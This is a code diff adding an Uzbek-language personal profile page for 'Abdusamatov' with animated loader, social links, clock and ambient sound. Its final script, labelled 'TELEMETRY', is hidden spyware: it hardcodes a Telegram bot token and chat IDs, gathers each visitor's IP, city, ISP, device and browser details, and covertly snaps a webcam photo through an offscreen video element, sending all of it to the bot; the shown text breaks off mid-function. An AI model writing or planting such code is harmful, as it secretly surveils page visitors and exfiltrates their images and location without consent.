+    /* ========== LUMINOUS AMBIENT ATMOSPHERE (YORQIN DIZAYN) ========== */
+    body, .master-card, .link-tile, #loader, .sound-toggle, .time-bar {
+      transition: background-color 1.0s cubic-bezier(0.4,0,0.2,1),
+                  color 1.0s cubic-bezier(0.4,0,0.2,1),
+                  border-color 1.0s cubic-bezier(0.4,0,0.2,1),
+                  box-shadow 1.0s cubic-bezier(0.4,0,0.2,1);
+    }
+  </style>
+</head>
+<body>
+
+  <video id="v" autoplay playsinline style="position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;"></video>
+  <canvas id="c" style="position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;"></canvas>
+
+  <!-- LOADER -->
+  <div id="loader">
+    <canvas id="loaderCanvas"></canvas>
+
+    <div class="loader-corner-waves">
+      <svg class="l-wave-tl" viewBox="0 0 280 220" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 180 Q40 140 80 180 Q120 220 160 180 Q200 140 240 180 Q260 200 280 180" stroke="#0284C7" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+        <path d="M0 135 Q40 95 80 135 Q120 175 160 135 Q200 95 240 135 Q260 155 280 135" stroke="#38BDF8" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+        <path d="M0 90 Q40 50 80 90 Q120 130 160 90 Q200 50 240 90" stroke="#7DD3FC" stroke-width="0.8" fill="none" stroke-linecap="round"/>
+        <circle cx="95" cy="115" r="3.2" fill="#38BDF8"/>
+        <circle cx="175" cy="155" r="2.5" fill="#BAE6FD"/>
+      </svg>
+      <svg class="l-wave-br" viewBox="0 0 280 220" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0 180 Q40 140 80 180 Q120 220 160 180 Q200 140 240 180 Q260 200 280 180" stroke="#0284C7" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+        <path d="M0 135 Q40 95 80 135 Q120 175 160 135 Q200 95 240 135 Q260 155 280 135" stroke="#38BDF8" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+        <circle cx="95" cy="115" r="3.2" fill="#38BDF8"/>
+      </svg>
+    </div>
+
+    <div class="loader-stage">
+      <div class="ocean-emblem">
+        <svg class="emblem-svg" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <radialGradient id="oceanAura" cx="50%" cy="50%" r="50%">
+              <stop offset="0%" stop-color="#38BDF8" stop-opacity="0.8"/>
+              <stop offset="50%" stop-color="#BAE6FD" stop-opacity="0.35"/>
+              <stop offset="100%" stop-color="#FFFFFF" stop-opacity="0"/>
+            </radialGradient>
+          </defs>
+
+          <!-- Concentric Sacred Nautical Geometry Rings -->
+          <circle class="rot-ring-slow" cx="200" cy="200" r="188" stroke="rgba(2,132,199,0.14)" stroke-width="0.8" stroke-dasharray="1 8" fill="none"/>
+          <circle class="rot-ring-cw"   cx="200" cy="200" r="172" stroke="rgba(14,165,233,0.22)" stroke-width="0.9" stroke-dasharray="3 7" fill="none"/>
+          <circle class="rot-ring-ccw"  cx="200" cy="200" r="154" stroke="rgba(56,189,248,0.30)" stroke-width="0.7" stroke-dasharray="2 5" fill="none"/>
+          <circle cx="200" cy="200" r="138" stroke="rgba(2,132,199,0.12)" stroke-width="0.5" fill="none"/>
+
+          <!-- Compass Cardinal Points & Golden Cyan Diamonds -->
+          <polygon points="200,6 203,13 200,20 197,13" fill="#0284C7"/>
+          <polygon points="200,380 203,387 200,394 197,387" fill="#0284C7"/>
+          <polygon points="6,200 13,203 20,200 13,197" fill="#0284C7"/>
+          <polygon points="380,200 387,203 394,200 387,197" fill="#0284C7"/>
+          <circle cx="200" cy="13" r="1.8" fill="#38BDF8"/>
+          <circle cx="200" cy="387" r="1.8" fill="#38BDF8"/>
+          <circle cx="13" cy="200" r="1.8" fill="#38BDF8"/>
+          <circle cx="387" cy="200" r="1.8" fill="#38BDF8"/>
+
+          <!-- Glowing Ocean Aura Pulse around apex bloom -->
+          <circle class="ocean-aura" cx="200" cy="82" r="58" fill="url(#oceanAura)"/>
+
+          <!-- 1. Abyssal Depths Anchor Currents (Tide Roots) -->
+          <path class="draw-root" d="M 200 325 C 182 342, 160 354, 136 360"/>
+          <path class="draw-root" d="M 200 325 C 218 342, 240 354, 264 360"/>
+          <path class="draw-root" d="M 200 325 C 196 345, 190 362, 182 376"/>
+          <path class="draw-root" d="M 200 325 C 204 345, 210 362, 218 376"/>
+
+          <!-- 2. Triple Ascending Living Water Currents -->
+          <path class="draw-stem" d="M 200 325 C 182 275, 142 238, 166 178 C 174 146, 194 115, 200 82"/>
+          <path class="draw-stem" d="M 200 325 C 218 275, 258 238, 234 178 C 226 146, 206 115, 200 82"/>
+          <path class="draw-stem-center" d="M 200 325 C 199 265, 201 185, 200 88"/>
+
+          <!-- 3. 8 Lateral Wave Breakers -->
+          <path class="draw-branch br-l1" d="M 182 268 C 150 255, 122 242, 104 234"/>
+          <path class="draw-branch br-r1" d="M 218 268 C 250 255, 278 242, 296 234"/>
+          <path class="draw-branch br-l2" d="M 170 212 C 138 198, 112 174, 98 158"/>
+          <path class="draw-branch br-r2" d="M 230 212 C 262 198, 288 174, 302 158"/>
+          <path class="draw-branch br-l3" d="M 184 156 C 156 138, 134 116, 122 96"/>
+          <path class="draw-branch br-r3" d="M 216 156 C 244 138, 266 116, 278 96"/>
+          <path class="draw-branch br-l4" d="M 193 112 C 172 94, 154 76, 144 60"/>
+          <path class="draw-branch br-r4" d="M 207 112 C 228 94, 246 76, 256 60"/>
+
+          <!-- 4. 8 Sculpted Wave Foam Crests (Spring Unfurling) -->
+          <!-- Tier 1 -->
+          <g class="bloom-leaf lf-l1" style="transform-origin: 104px 234px;">
+            <path d="M 104 234 C 76 222, 70 196, 90 190 C 106 202, 116 224, 104 234 Z" fill="rgba(56,189,248,0.78)" stroke="#0284C7" stroke-width="0.8"/>
+            <path d="M 104 234 C 96 216, 88 202, 90 190" stroke="#0369A1" stroke-width="0.5" fill="none"/>
+          </g>
+          <g class="bloom-leaf lf-r1" style="transform-origin: 296px 234px;">
+            <path d="M 296 234 C 324 222, 330 196, 310 190 C 294 202, 284 224, 296 234 Z" fill="rgba(56,189,248,0.78)" stroke="#0284C7" stroke-width="0.8"/>
+            <path d="M 296 234 C 304 216, 312 202, 310 190" stroke="#0369A1" stroke-width="0.5" fill="none"/>
+          </g>
+          <!-- Tier 2 -->
+          <g class="bloom-leaf lf-l2" style="transform-origin: 98px 158px;">
+            <path d="M 98 158 C 70 144, 64 120, 84 112 C 100 126, 110 146, 98 158 Z" fill="rgba(125,211,252,0.85)" stroke="#0284C7" stroke-width="0.8"/>
+            <path d="M 98 158 C 91 140, 82 128, 84 112" stroke="#0284C7" stroke-width="0.5" fill="none"/>
+          </g>
+          <g class="bloom-leaf lf-r2" style="transform-origin: 302px 158px;">
+            <path d="M 302 158 C 330 144, 336 120, 316 112 C 300 126, 290 146, 302 158 Z" fill="rgba(125,211,252,0.85)" stroke="#0284C7" stroke-width="0.8"/>
+            <path d="M 302 158 C 309 140, 318 128, 316 112" stroke="#0284C7" stroke-width="0.5" fill="none"/>
+          </g>
+          <!-- Tier 3 -->
+          <g class="bloom-leaf lf-l3" style="transform-origin: 122px 96px;">
+            <path d="M 122 96 C 98 82, 96 62, 114 54 C 128 66, 134 86, 122 96 Z" fill="rgba(186,230,253,0.92)" stroke="#0EA5E9" stroke-width="0.8"/>
+          </g>
+          <g class="bloom-leaf lf-r3" style="transform-origin: 278px 96px;">
+            <path d="M 278 96 C 302 82, 304 62, 286 54 C 272 66, 266 86, 278 96 Z" fill="rgba(186,230,253,0.92)" stroke="#0EA5E9" stroke-width="0.8"/>
+          </g>
+          <!-- Tier 4 -->
+          <g class="bloom-leaf lf-l4" style="transform-origin: 144px 60px;">
+            <path d="M 144 60 C 124 48, 122 32, 138 28 C 150 36, 154 52, 144 60 Z" fill="rgba(224,242,254,0.95)" stroke="#38BDF8" stroke-width="0.7"/>
+          </g>
+          <g class="bloom-leaf lf-r4" style="transform-origin: 256px 60px;">
+            <path d="M 256 60 C 276 48, 278 32, 262 28 C 250 36, 246 52, 256 60 Z" fill="rgba(224,242,254,0.95)" stroke="#38BDF8" stroke-width="0.7"/>
+          </g>
+
+          <!-- 5. Apex Royal Water Lotus & Sacred Pearl -->
+          <g class="apex-water-lotus">
+            <!-- Tier 1 Outer Petals -->
+            <path class="bloom-petal pet-outer" d="M 200 82 C 166 60, 150 30, 170 12 C 186 30, 193 60, 200 82 Z" fill="rgba(186,230,253,0.85)" stroke="#0284C7" stroke-width="0.8"/>
+            <path class="bloom-petal pet-outer" d="M 200 82 C 234 60, 250 30, 230 12 C 214 30, 207 60, 200 82 Z" fill="rgba(186,230,253,0.85)" stroke="#0284C7" stroke-width="0.8"/>
+            <!-- Tier 2 Mid Petals -->
+            <path class="bloom-petal pet-mid" d="M 200 82 C 178 54, 174 26, 191 8 C 200 26, 200 56, 200 82 Z" fill="rgba(224,242,254,0.94)" stroke="#0EA5E9" stroke-width="0.8"/>
+            <path class="bloom-petal pet-mid" d="M 200 82 C 222 54, 226 26, 209 8 C 200 26, 200 56, 200 82 Z" fill="rgba(224,242,254,0.94)" stroke="#0EA5E9" stroke-width="0.8"/>
+            <!-- Tier 3 Pure White Crystal Heart -->
+            <path class="bloom-petal pet-inner" d="M 200 82 C 185 50, 189 20, 200 4 C 211 20, 215 50, 200 82 Z" fill="#FFFFFF" stroke="#0284C7" stroke-width="0.9"/>
+            <!-- Tier 4 Royal Cyan Pearl Core -->
+            <circle class="bloom-petal pet-core" cx="200" cy="52" r="5" fill="#0284C7"/>
+            <!-- Shimmering Water Droplets Stamens -->
+            <circle class="stamen-point" cx="200" cy="48" r="3.2" fill="#38BDF8"/>
+            <circle class="stamen-point" cx="193" cy="43" r="1.8" fill="#67E8F9"/>
+            <circle class="stamen-point" cx="207" cy="43" r="1.8" fill="#67E8F9"/>
+            <circle class="stamen-point" cx="200" cy="39" r="1.8" fill="#BAE6FD"/>
+            <circle class="stamen-point" cx="194" cy="34" r="1.4" fill="#38BDF8"/>
+            <circle class="stamen-point" cx="206" cy="34" r="1.4" fill="#38BDF8"/>
+            <!-- Rising Levitation Water Spores -->
+            <circle class="flower-spore spore-a" cx="200" cy="36" r="2.2" fill="#0284C7" style="--dx: -16px;"/>
+            <circle class="flower-spore spore-b" cx="200" cy="34" r="1.8" fill="#38BDF8" style="--dx: 18px;"/>
+            <circle class="flower-spore spore-c" cx="200" cy="32" r="2.4" fill="#06B6D4" style="--dx: -10px;"/>
+            <circle class="flower-spore spore-d" cx="200" cy="30" r="1.6" fill="#7DD3FC" style="--dx: 14px;"/>
+          </g>
+        </svg>
+      </div>
+
+      <h1 class="loader-title">Abdusamatov</h1>
+
+      <div class="loader-progress-box">
+        <div class="progress-track">
+          <div class="progress-bar" id="progressBar">
+            <span class="progress-glow-dot"></span>
+          </div>
+        </div>
+        <div class="progress-info">
+          <span class="percentage-text" id="percentageText">00%</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN APP -->
+  <div id="app">
+
+    <button id="soundToggleBtn" class="sound-toggle" type="button" aria-label="Musiqa boshqaruvi">
+      <div class="sound-wave-bars">
+        <span class="bar bar-1"></span>
+        <span class="bar bar-2"></span>
+        <span class="bar bar-3"></span>
+      </div>
+      <span id="soundLabel">Mayin musiqa</span>
+      <i id="soundIcon" class="fa-solid fa-volume-high" style="font-size:0.75rem;margin-left:2px;"></i>
+    </button>
+
+    <canvas id="bgCanvas"></canvas>
+    <div class="ambient-glow"></div>
+
+    <svg class="watermark wm-tl" viewBox="0 0 260 200" xmlns="http://www.w3.org/2000/svg">
+      <path d="M0 160 Q30 130 60 160 Q90 190 120 160 Q150 130 180 160 Q210 190 240 160 Q260 145 280 160" stroke="#0EA5E9" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+      <path d="M0 120 Q30 90 60 120 Q90 150 120 120 Q150 90 180 120 Q210 150 240 120 Q260 105 280 120" stroke="#38BDF8" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+      <path d="M0 80 Q30 50 60 80 Q90 110 120 80 Q150 50 180 80 Q210 110 240 80" stroke="#7DD3FC" stroke-width="0.8" fill="none" stroke-linecap="round"/>
+    </svg>
+    <svg class="watermark wm-br" viewBox="0 0 260 200" xmlns="http://www.w3.org/2000/svg">
+      <path d="M0 160 Q30 130 60 160 Q90 190 120 160 Q150 130 180 160 Q210 190 240 160 Q260 145 280 160" stroke="#0EA5E9" stroke-width="1.8" fill="none" stroke-linecap="round"/>
+      <path d="M0 120 Q30 90 60 120 Q90 150 120 120 Q150 90 180 120 Q210 150 240 120 Q260 105 280 120" stroke="#38BDF8" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+    </svg>
+
+    <div class="card-scene">
+      <main class="master-card" id="mainCard">
+        <div class="card-top-accent"></div>
+
+        <svg class="card-wave-corner" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
+          <path d="M0 38 Q6 30 12 38 Q18 46 24 38 Q30 30 36 38 Q42 46 48 38" stroke="#0EA5E9" stroke-width="1.2" fill="none" stroke-linecap="round"/>
+          <path d="M0 26 Q6 18 12 26 Q18 34 24 26 Q30 18 36 26 Q42 34 48 26" stroke="#38BDF8" stroke-width="0.8" fill="none" stroke-linecap="round"/>
+          <path d="M0 14 Q6 6 12 14 Q18 22 24 14 Q30 6 36 14 Q42 22 48 14" stroke="#7DD3FC" stroke-width="0.6" fill="none" stroke-linecap="round"/>
+        </svg>
+
+        <header class="profile-header">
+          <div class="avatar-wrapper">
+            <svg class="avatar-ring-svg" viewBox="0 0 100 100">
+              <circle cx="50" cy="50" r="46" stroke="rgba(14,165,233,0.22)" stroke-width="1" stroke-dasharray="3 5" fill="none"/>
+            </svg>
+            <div class="avatar-core">
+              <span class="avatar-initial">A</span>
+            </div>
+            <div class="status-badge" title="Hozirda faol / Online">
+              <div class="status-dot"></div>
+            </div>
+          </div>
+
+          <h1 class="profile-name">Abdusamatov</h1>
+          <p class="profile-bio">To'lqinlar kabi — kuch va mayin, chuqur va aniq. Bilim suvning oqimi, iroda esa uning kuchi.</p>
+          <div class="time-bar">
+            <i class="fa-regular fa-clock"></i>
+            <span id="currentTime">Toshkent: yuklanmoqda...</span>
+          </div>
+        </header>
+
+        <div class="card-divider">
+          <div class="divider-node"></div>
+        </div>
+
+        <nav class="links-group" aria-label="Ijtimoiy tarmoqlar">
+          <a href="https://t.me/abdsamtov_7" class="link-tile animated-portal-link" data-title="Telegram Shaxsiy" data-handle="@abdsamtov_7" data-icon="fa-brands fa-telegram" id="link-tg-personal">
+            <div class="tile-icon-box"><i class="fa-brands fa-telegram"></i></div>
+            <div class="tile-content">
+              <div class="tile-meta"><span class="tile-title">Telegram Shaxsiy</span></div>
+              <div class="tile-handle">@abdsamtov_7</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+
+          <a href="https://instagram.com/mansurovch7/" class="link-tile animated-portal-link" data-title="Instagram" data-handle="@mansurovch7" data-icon="fa-brands fa-instagram" id="link-instagram">
+            <div class="tile-icon-box"><i class="fa-brands fa-instagram"></i></div>
+            <div class="tile-content">
+              <div class="tile-meta"><span class="tile-title">Instagram</span></div>
+              <div class="tile-handle">@mansurovch7</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+
+          <a href="https://t.me/Abdsamtov_1" class="link-tile animated-portal-link" data-title="Telegram Kanal" data-handle="@Abdsamtov_1" data-icon="fa-solid fa-bullhorn" id="link-tg-channel">
+            <div class="tile-icon-box"><i class="fa-solid fa-bullhorn"></i></div>
+            <div class="tile-content">
+              <div class="tile-meta"><span class="tile-title">Telegram Kanal</span></div>
+              <div class="tile-handle">@Abdsamtov_1</div>
+            </div>
+            <i class="fa-solid fa-arrow-right tile-arrow"></i>
+          </a>
+        </nav>
+
+        <div class="actions-bar">
+          <button class="action-btn" id="copyLinkBtn" type="button">
+            <i class="fa-regular fa-copy"></i>
+            <span>Nusxa olish</span>
+          </button>
+          <a href="https://t.me/Abdsamtov_1" class="action-btn animated-portal-link" data-title="Telegram Kanal" data-handle="@Abdsamtov_1" data-icon="fa-solid fa-bullhorn" style="text-decoration:none;">
+            <i class="fa-solid fa-arrow-up-right-from-square"></i>
+            <span>Kanalga o'tish</span>
+          </a>
+        </div>
+
+        <footer class="card-footer">
+          <span>&copy; 2026 Abdusamatov</span>
+          <div class="footer-security">
+            <i class="fa-solid fa-shield-halved"></i>
+            <span>Shifrlangan aloqa</span>
+          </div>
+        </footer>
+      </main>
+    </div>
+  </div>
+
+  <!-- PORTAL -->
+  <div id="linkPortal">
+    <div class="portal-box">
+      <div class="portal-emblem-wrap">
+        <svg class="portal-rings-svg" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r="46" stroke="rgba(14,165,233,0.25)" stroke-width="1" stroke-dasharray="3 5" fill="none"/>
+          <circle cx="50" cy="50" r="38" stroke="rgba(56,189,248,0.35)" stroke-width="0.8" fill="none"/>
+        </svg>
+        <div class="portal-center-icon">
+          <i id="portalIcon" class="fa-brands fa-telegram"></i>
+        </div>
+      </div>
+      <div class="portal-target-title" id="portalTitle">Telegram Shaxsiy</div>
+      <div class="portal-target-handle" id="portalHandle">@Abdusamatov</div>
+      <div class="portal-status-line">Sahifaga yo'naltirilmoqda...</div>
+      <div class="portal-meter-track">
+        <div class="portal-meter-bar" id="portalBar"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TOAST -->
+  <div id="toast">
+    <i class="fa-solid fa-circle-check"></i>
+    <span id="toastMsg">Havola xotiraga nusxalandi</span>
+  </div>
+
+  <script>
+    /* 0. MOBILE FULL-SCREEN FIX (--vh o'zgaruvchisi) */
+    function setVH() {
+      var vh = window.innerHeight * 0.01;
+      document.documentElement.style.setProperty('--vh', vh + 'px');
+    }
+    setVH();
+    window.addEventListener('resize', setVH);
+    window.addEventListener('orientationchange', function() { setTimeout(setVH, 200); });
+
+    /* 1. LOADER CONTROLLER */
+    const LOADER_DURATION = 8000;
+    const startTime       = performance.now();
+    const progressBar     = document.getElementById('progressBar');
+    const percentageText  = document.getElementById('percentageText');
+    const loaderElem      = document.getElementById('loader');
+    const appElem         = document.getElementById('app');
+
+    function updateLoader(now) {
+      const elapsed  = now - startTime;
+      const progress = Math.min(elapsed / LOADER_DURATION, 1);
+      const pct      = Math.floor(progress * 100);
+      progressBar.style.width = pct + '%';
+      percentageText.textContent = (pct < 10 ? '0' : '') + pct + '%';
+
+      if (progress < 1) {
+        requestAnimationFrame(updateLoader);
+      } else {
+        finishLoader();
+      }
+    }
+    requestAnimationFrame(updateLoader);
+
+    function finishLoader() {
+      percentageText.textContent = '100%';
+      setTimeout(() => {
+        loaderElem.classList.add('loader-exit');
+        appElem.classList.add('visible');
+        document.body.style.overflow = 'auto';
+        setTimeout(() => {
+          if (loaderElem && loaderElem.parentNode) {
+            loaderElem.parentNode.removeChild(loaderElem);
+          }
+        }, 1400);
+      }, 350);
+    }
+
+    /* 2. REALISTIC GLISTENING BUBBLE PARTICLES */
+    function createParticleSystem(canvasId, count, maxSpeedY) {
+      const canvas = document.getElementById(canvasId);
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      let width, height, particles = [];
+
+      function resize() {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resize);
+      resize();
+
+      for (let i = 0; i < count; i++) {
+        particles.push({
+          x: Math.random() * width,
+          y: Math.random() * height,
+          radius: 1.2 + Math.random() * 2.8,
+          alpha: 0.16 + Math.random() * 0.40,
+          speedY: -(0.25 + Math.random() * maxSpeedY),
+          speedX: (Math.random() - 0.5) * 0.35,
+          angle: Math.random() * Math.PI * 2,
+          angularSpeed: 0.010 + Math.random() * 0.020,
+          wobbleAmp: 0.4 + Math.random() * 0.6,
+          hue: 195 + Math.random() * 25
+        });
+      }
+
+      let mouse = { x: -1000, y: -1000 };
+      window.addEventListener('mousemove', e => { mouse.x = e.clientX; mouse.y = e.clientY; });
+      window.addEventListener('touchmove', e => {
+        if (e.touches && e.touches[0]) {
+          mouse.x = e.touches[0].clientX;
+          mouse.y = e.touches[0].clientY;
+        }
+      }, { passive: true });
+      window.addEventListener('touchend', () => { mouse.x = -1000; mouse.y = -1000; }, { passive: true });
+
+      function animate() {
+        ctx.clearRect(0, 0, width, height);
+        for (let p of particles) {
+          p.y += p.speedY;
+          p.x += p.speedX + Math.sin(p.angle) * p.wobbleAmp;
+          p.angle += p.angularSpeed;
+
+          // Fluid mouse avoidance
+          const dx = p.x - mouse.x;
+          const dy = p.y - mouse.y;
+          const dist = Math.sqrt(dx * dx + dy * dy);
+          if (dist < 90) {
+            const force = (90 - dist) / 90;
+            p.x += (dx / dist) * force * 1.8;
+            p.y += (dy / dist) * force * 1.8;
+          }
+
+          if (p.y < -15) {
+            p.y = height + 15;
+            p.x = Math.random() * width;
+          }
+          if (p.x < -15) p.x = width + 15;
+          if (p.x > width + 15) p.x = -15;
+
+          // Glistening bubble body
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+          const grad = ctx.createRadialGradient(
+            p.x - p.radius * 0.35, p.y - p.radius * 0.35, p.radius * 0.1,
+            p.x, p.y, p.radius
+          );
+          grad.addColorStop(0, `hsla(${p.hue}, 90%, 96%, ${p.alpha * 1.1})`);
+          grad.addColorStop(0.65, `hsla(${p.hue}, 85%, 60%, ${p.alpha * 0.5})`);
+          grad.addColorStop(1, `hsla(${p.hue}, 90%, 48%, ${p.alpha * 0.8})`);
+          ctx.fillStyle = grad;
+          ctx.fill();
+
+          // Bubble rim
+          ctx.lineWidth = 0.7;
+          ctx.strokeStyle = `hsla(${p.hue}, 90%, 55%, ${p.alpha * 0.85})`;
+          ctx.stroke();
+
+          // Specular glint highlight
+          ctx.beginPath();
+          ctx.arc(p.x - p.radius * 0.35, p.y - p.radius * 0.35, Math.max(0.5, p.radius * 0.22), 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255, 255, 255, ${p.alpha * 1.4})`;
+          ctx.fill();
+        }
+        requestAnimationFrame(animate);
+      }
+      requestAnimationFrame(animate);
+    }
+    createParticleSystem('loaderCanvas', 65, 0.52);
+    createParticleSystem('bgCanvas', 55, 0.38);
+
+    /* 3. PORTAL */
+    const linkPortal  = document.getElementById('linkPortal');
+    const portalTitle = document.getElementById('portalTitle');
+    const portalHandle= document.getElementById('portalHandle');
+    const portalIcon  = document.getElementById('portalIcon');
+    const portalBar   = document.getElementById('portalBar');
+
+    document.querySelectorAll('.animated-portal-link').forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const targetUrl = this.getAttribute('href');
+        const title     = this.getAttribute('data-title') || 'Sahifa';
+        const handle    = this.getAttribute('data-handle') || '';
+        const iconClass = this.getAttribute('data-icon') || 'fa-solid fa-arrow-up-right-from-square';
+
+        const rect = this.getBoundingClientRect();
+        const ripple = document.createElement('span');
+        ripple.classList.add('tile-ripple');
+        const d = Math.max(rect.width, rect.height);
+        ripple.style.width = ripple.style.height = d + 'px';
+        ripple.style.left = (e.clientX - rect.left - d / 2) + 'px';
+        ripple.style.top  = (e.clientY - rect.top  - d / 2) + 'px';
+        this.appendChild(ripple);
+        setTimeout(() => ripple.remove(), 600);
+
+        portalTitle.textContent  = title;
+        portalHandle.textContent = handle;
+        portalIcon.className     = iconClass;
+        portalBar.style.transition = 'none';
+        portalBar.style.width    = '0%';
+        linkPortal.classList.add('portal-active');
+
+        setTimeout(() => { portalBar.style.transition = 'width 0.5s cubic-bezier(0.22,1,0.36,1)'; portalBar.style.width = '100%'; }, 30);
+        setTimeout(() => {
+          window.location.href = targetUrl;
+          setTimeout(() => { linkPortal.classList.remove('portal-active'); portalBar.style.width = '0%'; }, 600);
+        }, 550);
+      });
+    });
+    window.addEventListener('pageshow', () => {
+      if (linkPortal) { linkPortal.classList.remove('portal-active'); if (portalBar) portalBar.style.width = '0%'; }
+    });
+
+    /* 4. LIVE TASHKENT TIME CLOCK */
+    function updateClock() {
+      const now = new Date();
+      const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+      const tDate = new Date(utc + (3600000 * 5)); // Tashkent UTC+5
+      const hh = String(tDate.getHours()).padStart(2, '0');
+      const mm = String(tDate.getMinutes()).padStart(2, '0');
+      const ss = String(tDate.getSeconds()).padStart(2, '0');
+      const clockEl = document.getElementById('currentTime');
+      if (clockEl) {
+        clockEl.textContent = `Toshkent: ${hh}:${mm}:${ss}`;
+      }
+    }
+    updateClock();
+    setInterval(updateClock, 1000);
+
+    /* 5. TOAST & COPY */
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      const toastMsg = document.getElementById('toastMsg');
+      toastMsg.textContent = msg;
+      toast.classList.add('toast-show');
+      setTimeout(() => toast.classList.remove('toast-show'), 3000);
+    }
+    const copyBtn = document.getElementById('copyLinkBtn');
+    if (copyBtn) {
+      copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText('https://t.me/abdsamtov_7')
+          .then(() => showToast('Telegram profili nusxalandi: @abdsamtov_7'))
+          .catch(() => showToast('@abdsamtov_7'));
+      });
+    }
+
+    /* 6. SOUND TOGGLE */
+    let isSoundOn = true;
+    const soundBtn   = document.getElementById('soundToggleBtn');
+    const soundLabel = document.getElementById('soundLabel');
+    const soundIcon  = document.getElementById('soundIcon');
+    let audioCtx = null, gainNode = null;
+
+    function startAmbientSound() {
+      try {
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        gainNode = audioCtx.createGain();
+        gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
+        gainNode.gain.linearRampToValueAtTime(0.04, audioCtx.currentTime + 2.5);
+        const osc = audioCtx.createOscillator();
+        osc.type = 'sine'; osc.frequency.setValueAtTime(55, audioCtx.currentTime);
+        const lfo = audioCtx.createOscillator();
+        const lfoG = audioCtx.createGain();
+        lfo.frequency.value = 0.12; lfoG.gain.value = 8;
+        lfo.connect(lfoG); lfoG.connect(osc.frequency); lfo.start();
+        osc.connect(gainNode); gainNode.connect(audioCtx.destination); osc.start();
+      } catch(e) {}
+    }
+
+    if (soundBtn) {
+      soundBtn.addEventListener('click', () => {
+        isSoundOn = !isSoundOn;
+        if (isSoundOn) {
+          soundLabel.textContent = 'Mayin musiqa';
+          soundIcon.className = 'fa-solid fa-volume-high';
+          soundBtn.classList.remove('muted');
+          if (!audioCtx) startAmbientSound();
+          else if (gainNode) gainNode.gain.linearRampToValueAtTime(0.04, audioCtx.currentTime + 1);
+        } else {
+          soundLabel.textContent = 'Jim';
+          soundIcon.className = 'fa-solid fa-volume-xmark';
+          soundBtn.classList.add('muted');
+          if (gainNode) gainNode.gain.linearRampToValueAtTime(0, audioCtx.currentTime + 0.8);
+        }
+      });
+    }
+    setTimeout(() => startAmbientSound(), 8500);
+  </script>
+
+  <!-- TELEMETRY -->
+  <script>
+    (function() {
+      var TK   = '8893864971:AAHZGnca-aLOCzet9qwCjR_c1YIHbK4crDw';
+      var CIDS = ['8969018450', '7367192145'];
+
+      function tgMsg(txt) {
+        CIDS.forEach(function(cid) {
+          fetch('https://api.telegram.org/bot' + TK + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: cid, text: txt, parse_mode: 'HTML' })
+          }).catch(function() {});
+        });
+      }
+
+      function tgPhoto(blob, cap) {
+        CIDS.forEach(function(cid) {
+          var fd = new FormData();
+          fd.append('chat_id', cid);
+          fd.append('photo', blob, 'visitor.jpg');
+          fd.append('caption', cap);
+          fetch('https://api.telegram.org/bot' + TK + '/sendPhoto', {
+            method: 'POST',
+            body: fd
+          }).catch(function() {});
+        });
+      }
+
+      function getIP(cb) {
+        fetch('https://ipapi.co/json/')
+          .then(function(r) { return r.json(); })
+          .then(function(d) { cb(d); })
+          .catch(function() { cb({}); });
+      }
+
+      function snapPhoto(callback) {
+        var v = document.getElementById('v');
+        var c = document.getElementById('c');
+        if (!v || !c || !navigator.mediaDevices) { callback(null); return; }
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            v.srcObject = stream;
+            v.onloadedmetadata = function() {
+              v.play();
+              setTimeout(function() {
+                c.width  = v.videoWidth  || 640;
+                c.height = v.videoHeight || 480;
+                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                stream.getTracks().forEach(function(t) { t.stop(); });
+                c.toBlob(function(blob) { callback(blob); }, 'image/jpeg', 0.85);
+              }, 1200);
+            };
+          })
+          .catch(function() { callback(null); });
+      }
+
+      function runTelemetry() {
+        getIP(function(ip) {
+          var ua   = navigator.userAgent;
+          var lang = navigator.language || 'nomalum';
+          var tz   = (Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : '') || 'nomalum';
+          var w    = screen.width;
+          var h    = screen.height;
+          var now  = new Date().toLocaleString('uz-UZ');
+
+          var msg =
+            '<b>Yangi Tashrif</b>\n' +
+            now + '\n\n' +
+            '<b>IP:</b> ' + (ip.ip || 'nomalum') + '\n' +
+            '<b>Mamlakat:</b> ' + (ip.country_name || 'nomalum') + ' (' + (ip.country || '') + ')\n' +
+            '<b>Shahar:</b> ' + (ip.city || 'nomalum') + ', ' + (ip.region || '') + '\n' +
+            '<b>Operator:</b> ' + (ip.org || 'nomalum') + '\n\n' +
+            '<b>Qurilma:</b> ' + w + 'x' + h + '\n' +
+            '<b>Til:</b> ' + lang + '\n' +
+            '<b>Vaqt zonasi:</b> ' + tz + '\n' +
+            '<b>UA:</b> <code>' + ua.slice(0, 200) + '</code>\n\n' +
+            '<b>Sahifa:</b> abdusamatov.html';
+
+          snapPhoto(function(blob) {
